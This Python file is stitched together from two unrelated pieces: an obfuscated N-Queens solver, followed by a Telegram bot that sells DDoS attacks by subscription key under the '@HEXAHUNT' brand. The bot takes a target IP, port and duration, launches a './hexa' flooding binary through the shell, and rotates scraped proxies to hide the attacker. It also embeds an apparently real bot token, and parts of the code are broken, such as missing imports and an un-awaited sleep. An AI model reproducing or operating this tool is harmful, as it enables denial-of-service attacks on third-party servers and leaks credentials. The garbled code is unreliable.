"#line:4
__all__ =[]#line:6
class OOO0OO0OOO00O00OO :#line:8
    ""#line:9
    def __init__ (O0OO0OOOO0OO00O0O ,O00OO0OO0O00OO0OO ):#line:11
        O0OO0OOOO0OO00O0O .__OOOOO0OOOO0O000O0 =O00OO0OO0O00OO0OO #line:13
        O0OO0OOOO0OO00O0O .__O0000O00000OO0O0O =0 #line:14
        O0OO0OOOO0OO00O0O .__OOOO0O000O00OOO0O ()#line:15
    def __OOOO0O000O00OOO0O (OO0O0OO00O0O00O0O ):#line:17
        ""#line:18
        O0O0O0O0OO0OO0000 =[-1 ]*OO0O0OO00O0O00O0O .__OOOOO0OOOO0O000O0 #line:19
        OO0O0OO00O0O00O0O .__O000OOOO00O0000OO (O0O0O0O0OO0OO0000 ,0 )#line:20
        print ("Found",OO0O0OO00O0O00O0O .__O0000O00000OO0O0O ,"solutions.")#line:21
    def __O000OOOO00O0000OO (O0O0O0OOOO00OO000 ,O0O0O00OO00OOOOO0 ,OOO00000000000O0O ):#line:23
        ""#line:28
        if OOO00000000000O0O ==O0O0O0OOOO00OO000 .__OOOOO0OOOO0O000O0 :#line:30
            O0O0O0OOOO00OO000 .__OO00O00OOOOO00000 (O0O0O00OO00OOOOO0 )#line:31
            O0O0O0OOOO00OO000 .__O0000O00000OO0O0O +=1 #line:32
        else :#line:33
            for OOOOOOOOOOOO0OO00 in range (O0O0O0OOOO00OO000 .__OOOOO0OOOO0O000O0 ):#line:35
                if O0O0O0OOOO00OO000 .__O00OOO0OO00O00000 (O0O0O00OO00OOOOO0 ,OOO00000000000O0O ,OOOOOOOOOOOO0OO00 ):#line:37
                    O0O0O00OO00OOOOO0 [OOO00000000000O0O ]=OOOOOOOOOOOO0OO00 #line:38
                    O0O0O0OOOO00OO000 .__O000OOOO00O0000OO (O0O0O00OO00OOOOO0 ,OOO00000000000O0O +1 )#line:39
    def __O00OOO0OO00O00000 (OO000O0O00000O00O ,OO0O00OO0000OOO00 ,O0O0O00OOO00OOOO0 ,OO00000O0000000OO ):#line:42
        ""#line:71
        for O00OO00OOOO0OO0OO in range (O0O0O00OOO00OOOO0 ):#line:72
            if OO0O00OO0000OOO00 [O00OO00OOOO0OO0OO ]==OO00000O0000000OO or OO0O00OO0000OOO00 [O00OO00OOOO0OO0OO ]-O00OO00OOOO0OO0OO ==OO00000O0000000OO -O0O0O00OOO00OOOO0 or OO0O00OO0000OOO00 [O00OO00OOOO0OO0OO ]+O00OO00OOOO0OO0OO ==OO00000O0000000OO +O0O0O00OOO00OOOO0 :#line:75
                return False #line:77
        return True #line:78
    def __OO00O00OOOOO00000 (OOOOOO0OO00000O0O ,O000O0O00O0O000O0 ):#line:80
        ""#line:81
        for OO0OO00OOOOOOOO00 in range (OOOOOO0OO00000O0O .__OOOOO0OOOO0O000O0 ):#line:82
            O0O0O0OO0000OOOOO =""#line:83
            for OO0O00O00OO000O0O in range (OOOOOO0OO00000O0O .__OOOOO0OOOO0O000O0 ):#line:84
                if O000O0O00O0O000O0 [OO0OO00OOOOOOOO00 ]==OO0O00O00OO000O0O :#line:85
                    O0O0O0OO0000OOOOO +="Q "#line:86
                else :#line:87
                    O0O0O0OO0000OOOOO +=". "#line:88
            print (O0O0O0OO0000OOOOO )#line:89
        print ("\n")#line:90
    def __O0000OOO0000O0000 (O0O00OOO0O000OO00 ,OO0O00O0OOO0O0O0O ):#line:92
        ""#line:96
        O00OOO0O0O0O0O0OO =""#line:97
        for OOO000OOO000O0O00 in range (O0O00OOO0O000OO00 .__OOOOO0OOOO0O000O0 ):#line:98
            O00OOO0O0O0O0O0OO +=str (OO0O00O0OOO0O0O0O [OOO000OOO000O0O00 ])+" "#line:99
        print (O00OOO0O0O0O0O0OO )#line:100
def O0OO0OO0OO00OO0O0 ():#line:102
    ""#line:103
    OOO0OO0OOO00O00OO (8 )#line:104
if __name__ =="__main__":#line:106
    O0OO0OO0OO00OO0O0 ()#line:108


# Initialize Firebase
cred = credentials.Certificate(firebase_credentials)
firebase_admin.initialize_app(cred)
db = firestore.client()

bot_token = '7358886296:AAFJ1gqqgR9bb9NhjDhFnR3hK0Bcu3_IR7Q'  # Replace with your bot token
proxy_api_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all'

# Global iterator for proxies
proxy_iterator = None
current_proxy = None

def get_proxies():
    global proxy_iterator
    try:
        response = requests.get(proxy_api_url)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            if proxies:
                proxy_iterator = itertools.cycle(proxies)
                return proxy_iterator
    except Exception as e:
        print(f"Error fetching proxies: {str(e)}")
    return None

def get_next_proxy():
    global proxy_iterator
    if proxy_iterator is None:
        proxy_iterator = get_proxies()
    return next(proxy_iterator, None)

def rotate_proxy(sent_message):
    global current_proxy
    while sent_message.time_remaining > 0:
        new_proxy = get_next_proxy()
        if new_proxy:
            current_proxy = new_proxy
            bot.proxy = {
                'http': f'http://{new_proxy}',
                'https': f'https://{new_proxy}'
            }
            if sent_message.time_remaining > 0:
                new_text = f"🚀⚡@HEXAHUNT BLACK MAGIC⚡🚀\n\n🎯 Target: {sent_message.target}\n🔌 Port: {sent_message.port}\n⏰ Time: {sent_message.time_remaining} Seconds\n🛡️ Proxy: RUNNING ON @HEXAHUNT SERVER\n"
                try:
                    bot.edit_message_text(new_text, chat_id=sent_message.chat.id, message_id=sent_message.message_id)
                except telebot.apihelper.ApiException as e:
                    if "message is not modified" not in str(e):
                        print(f"Error updating message: {str(e)}")
        time.sleep(5)

bot = telebot.TeleBot(bot_token)

ADMIN_IDS = [7410977141] # Replace with the actual admin's user ID

def generate_one_time_key():
    return secrets.token_urlsafe(16)

def validate_key(key):
    doc_ref = db.collection('keys').document(key)
    doc = doc_ref.get()
    if doc.exists and not doc.to_dict().get('used', False):
        return True, doc_ref
    return False, None

def set_key_as_used(doc_ref):
    doc_ref.update({'used': True})

def check_key_expiration(user_ref):
    user_doc = user_ref.get()
    if user_doc.exists:
        user_data = user_doc.to_dict()
        expiry_date = user_data.get('expiry_date')
        if expiry_date:
            now = datetime.now(timezone.utc)  # Make current time offset-aware
            if now > expiry_date:
                # Key has expired
                user_ref.update({'valid': False})
                return False
            return user_data.get('valid', False)
    return False

@bot.message_handler(commands=['start'])
def handle_start(message):
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        telebot.types.KeyboardButton("🔥 Attack"),
        telebot.types.KeyboardButton("🛑 Stop"),
        telebot.types.KeyboardButton("📞 Contact Admin"),
        telebot.types.KeyboardButton("🔑 Generate Key"),
        telebot.types.KeyboardButton("📋 Paste Key"),
        telebot.types.KeyboardButton("👤 My Account"),
       # telebot.types.KeyboardButton("⚙️ Admin Panel")
    )
    bot.send_message(message.chat.id, "*BUY TO KAR LE PAHLE*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "🔥 Attack":
        handle_attack_init(message)
    elif message.text == "🛑 Stop":
        handle_stop(message)
    elif message.text == "📞 Contact Admin":
        handle_contact_admin(message)
    elif message.text == "🔑 Generate Key":
        handle_generate_key(message)
    elif message.text == "📋 Paste Key":
        handle_paste_key(message)
    elif message.text == "👤 My Account":
        handle_my_account(message)
   # elif message.text == "⚙️ Admin Panel":
        handle_admin_panel(message)
    elif message.text == "🔙 Back":
        handle_start(message)
    elif message.text == "❌ Delete Key":
        handle_delete_key_prompt(message)
    elif message.text == "🗑️ Delete All":
        handle_delete_all(message) 

def handle_attack_init(message):
    bot.send_message(message.chat.id, "Enter the target IP, port, and time in the format and be ready to see power🔋: <IP> <port> <time>")
    bot.register_next_step_handler(message, process_attack)

def process_attack(message):
    try:
        command_parts = message.text.split()
        if len(command_parts) < 3:
            bot.reply_to(message, "Usage: <IP> <port> <time>")
            return

        username = message.from_user.username
        user_id = message.from_user.id
        target = command_parts[0]
        port = command_parts[1]
        attack_time = int(command_parts[2])

        user_ref = db.collection('users').document(str(user_id))
        if not check_key_expiration(user_ref):
            bot.reply_to(message, "*🚫 Your subscription has expired or is invalid 🚫.\n\nPlease contact @HEXAHUNT*", parse_mode='Markdown')
            return

        response = f"@{username}\n⚡ ATTACK STARTED CHAOS ⚡\n\n🎯 Target: {target}\n🔌 Port: {port}\n⏰ Time: {attack_time} Seconds\n🛡️ Proxy: RUNNING ON @HEXAHUNT SERVER\n"
        sent_message = bot.reply_to(message, response)
        sent_message.target = target
        sent_message.port = port
        sent_message.time_remaining = attack_time

        # Start attack immediately in a separate thread
        attack_thread = threading.Thread(target=run_attack, args=(target, port, attack_time, sent_message))
        attack_thread.start()

        # Start updating remaining time in another thread
        time_thread = threading.Thread(target=update_remaining_time, args=(attack_time, sent_message))
        time_thread.start()

        # Start rotating proxies in a separate thread
        proxy_thread = threading.Thread(target=rotate_proxy, args=(sent_message,))
        proxy_thread.start()

    except Exception as e:
        bot.reply_to(message, f"⚠️ An error occurred: {str(e)}")

def run_attack(target, port, attack_time, sent_message):
    try:
        full_command = f"./hexa {target} {port} {attack_time} 160"
        subprocess.run(full_command, shell=True)

        sent_message.time_remaining = 0
        final_response = f"🚀⚡ ATTACK FINISHED ⚡🚀"
        try:
            bot.edit_message_text(final_response, chat_id=sent_message.chat.id, message_id=sent_message.message_id)
        except telebot.apihelper.ApiException as e:
            if "message is not modified" not in str(e):
                print(f"Error updating message: {str(e)}")

    except Exception as e:
        bot.send_message(sent_message.chat.id, f"⚠️ An error occurred: {str(e)}")

def update_remaining_time(attack_time, sent_message):
    global current_proxy
    last_message_text = None
    for remaining in range(attack_time, 0, -1):
        if sent_message.time_remaining > 0:
            sent_message.time_remaining = remaining
            new_text =  f"🚀⚡ ATTACK STARTED ⚡🚀\n\n🎯 Target: {sent_message.target}\n🔌 Port: {sent_message.port}\n⏰ Time: {remaining} Seconds\n🛡️ Proxy: RUNNING ON @HEXAHUNT SERVER\n"
            
            # Update the message only if the new text is different from the last message text
            if new_text != last_message_text:
                try:
                    bot.edit_message_text(new_text, chat_id=sent_message.chat.id, message_id=sent_message.message_id)
                    last_message_text = new_text
                except telebot.apihelper.ApiException as e:
                    if "message is not modified" not in str(e):
                        print(f"Error updating message: {str(e)}")
        
        time.sleep(1)

    # Once the loop is finished, indicate the attack is finished without showing the details box
    final_response = f"🚀⚡ ATTACK FINISHED⚡🚀"
    try:
        if final_response != last_message_text:
            bot.edit_message_text(final_response, chat_id=sent_message.chat.id, message_id=sent_message.message_id)
    except telebot.apihelper.ApiException as e:
        if "message is not modified" not in str(e):
            print(f"Error updating message: {str(e)}")

def handle_stop(message):
    subprocess.run("pkill -f hexa", shell=True)
    bot.reply_to(message, "*🛑 Attack stopped.*", parse_mode='Markdown')

def handle_contact_admin(message):
    bot.reply_to(message, f"*🔆 Contact Admins 🔆\n\n🔱 ADMIN:-@HEXAHUNT*", parse_mode='Markdown')

def handle_generate_key(message):
    if message.from_user.id in ADMIN_IDS:
        bot.send_message(message.chat.id, "Enter the duration for the key in the format: <days> <hours> <minutes> <seconds>")
        bot.register_next_step_handler(message, process_generate_key)
    else:
        bot.reply_to(message, "*🚫 BHAI AUKAT ME TU KEY GENERATE NAHI KAR SAKTA.*", parse_mode='Markdown')

def process_generate_key(message):
    try:
        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, "Usage: <days> <hours> <minutes> <seconds>")
            return

        days = int(parts[0])
        hours = int(parts[1])
        minutes = int(parts[2])
        seconds = int(parts[3])
        expiry_date = datetime.now(timezone.utc) + timedelta(days=days, hours=hours, minutes=minutes, seconds=seconds)

        key = f"GENERATED_{generate_one_time_key()}"
        db.collection('keys').document(key).set({'expiry_date': expiry_date, 'used': False})

        bot.reply_to(message, f"*🔑 Generated Key:* `{key}`", parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"⚠️ An error occurred: {str(e)}")

def handle_paste_key(message):
    bot.send_message(message.chat.id, "*🔑 Enter the key:*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_paste_key)

def process_paste_key(message):
    key = message.text
    valid, doc_ref = validate_key(key)
    if valid:
        # Get the current user's ID and username
        user_id = str(message.from_user.id)
        username = message.from_user.username or "UNKNOWN"

        # Set the key as used and update the user information
        set_key_as_used(doc_ref)

        # Update the key document with the user who validated the key
        doc_ref.update({
            'user_id': user_id,
            'username': username
        })

        # Get the expiry date from the key document
        expiry_date = doc_ref.get().to_dict().get('expiry_date')

        # Update the user's document in the 'users' collection
        db.collection('users').document(user_id).set({
            'valid': True,
            'expiry_date': expiry_date
        }, merge=True)

        bot.reply_to(message, "*AB TUM VIP KING DDOS USE KARNE KE LIYE READY HO.*", parse_mode='Markdown')
    else:
        bot.reply_to(message, "*❌ NEW KEY BUY KAR LE GAREEB.*", parse_mode='Markdown')

def handle_my_account(message):
    user_id = str(message.from_user.id)
    user_ref = db.collection('users').document(user_id)

    if not check_key_expiration(user_ref):
        bot.reply_to(message, "*🚫 Your subscription has expired or is invalid.*", parse_mode='Markdown')
        return

    user_doc = user_ref.get()
    if user_doc.exists:
        user_data = user_doc.to_dict()
        bot.reply_to(message, f"*👤Account info:\n\n✅ Valid: {user_data['valid']}\n📅 Expiry Date: {user_data['expiry_date']}*, parse_mode='Markdown'")
    else:
        bot.reply_to(message, "*❓ No account information found.*\n\nCONTACT: @HEXAHUNT")

def handle_admin_panel(message):
    if message.from_user.id in ADMIN_IDS:
        bot.send_message(message.chat.id, "*⚙️ Fetching data... Please wait.*", parse_mode='Markdown')
        time.sleep(1)

        keys = db.collection('keys').stream()
        user_keys_info = []
        keys_dict = {}

        for idx, key in enumerate(keys):
            key_data = key.to_dict()
            key_id = key.id
            user_id = key_data.get('user_id', 'N/A')
            username = key_data.get('username', 'N/A')
            used = key_data.get('used', 'N/A')
            expiry_date = key_data.get('expiry_date', 'N/A')
            
            user_keys_info.append(f"{idx + 1}. 🔑 Key: {key_id}\n\n   👤 UserID: {user_id}\n   🧑 Username: @{username}\n   🔄 Used: {used}\n   📅 Expiry: {expiry_date}\n" )
            keys_dict[idx + 1] = key_id

        if not hasattr(bot, 'user_data'):
            bot.user_data = {}
        bot.user_data[message.chat.id] = keys_dict

        chunk_size = 10
        for i in range(0, len(user_keys_info), chunk_size):
            chunk = user_keys_info[i:i + chunk_size]
            bot.send_message(message.chat.id, "\n".join(chunk))

        markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        markup.add(
            telebot.types.KeyboardButton("🔙 Back"),
            telebot.types.KeyboardButton("❌ Delete Key"),
            telebot.types.KeyboardButton("🗑️ Delete All")
        )
        bot.send_message(message.chat.id, "Choose an option:", reply_markup=markup)
    else:
        bot.reply_to(message, "*🚫 You do not have permission to access the admin panel.*", parse_mode='Markdown')

def handle_delete_key_prompt(message):
    bot.send_message(message.chat.id, "Enter the key number to delete:")
    bot.register_next_step_handler(message, process_delete_key)

def process_delete_key(message):
    try:
        key_number = int(message.text)
        keys_dict = bot.user_data.get(message.chat.id, {})

        if key_number in keys_dict:
            key_id = keys_dict[key_number]
            key_doc = db.collection('keys').document(key_id)
            key_data = key_doc.get().to_dict()

            if key_data:
                user_id = key_data.get('user_id', 'N/A')

                # Delete the key and revoke the user's access
                key_doc.delete()

                if user_id != 'N/A':
                    db.collection('users').document(user_id).update({'valid': False})
                    bot.reply_to(message, f"*❌ Key {key_id} deleted and user access revoked.*", parse_mode='Markdown')
                else:
                    bot.reply_to(message, "*⚠️ Invalid user ID associated with the key.*", parse_mode='Markdown')
            else:
                bot.reply_to(message, "*❓ Key not found.*", parse_mode='Markdown')
        else:
            bot.reply_to(message, "*❌ Invalid key number.*", parse_mode='Markdown')
    except ValueError:
        bot.reply_to(message, "*Please enter a valid key number.*", parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"*⚠️ An error occurred: {str(e)}*", parse_mode='Markdown')

def handle_delete_all_prompt(message):
    bot.send_message(message.chat.id, "Are you sure you want to delete all keys and revoke all users? Type 'Yes' to confirm.")
    bot.register_next_step_handler(message, process_delete_all)

def process_delete_all(message):
    if message.text.lower() == 'yes':
        try:
            # Delete all keys
            keys = db.collection('keys').stream()
            for key in keys:
                key_data = key.to_dict()
                user_id = key_data.get('user_id', 'N/A')
                key.reference.delete()

                # Revoke user access if user_id is valid
                if user_id != 'N/A':
                    user_ref = db.collection('users').document(user_id)
                    user_ref.update({'valid': False})

            bot.reply_to(message, "*🗑️ All keys deleted and all user accesses revoked.*", parse_mode='Markdown')
        except Exception as e:
            bot.reply_to(message, f"⚠️ An error occurred: {str(e)}")
    else:
        bot.reply_to(message, "*❌ Operation canceled.*", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "🗑️ Delete All")
def handle_delete_all(message):
    if message.from_user.id in ADMIN_IDS:
        handle_delete_all_prompt(message)
    else:
        bot.reply_to(message, "*🚫 You do not have permission to perform this action.*", parse_mode='Markdown')

# Start polling
while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        asyncio.sleep(REQUEST_INTERVAL)
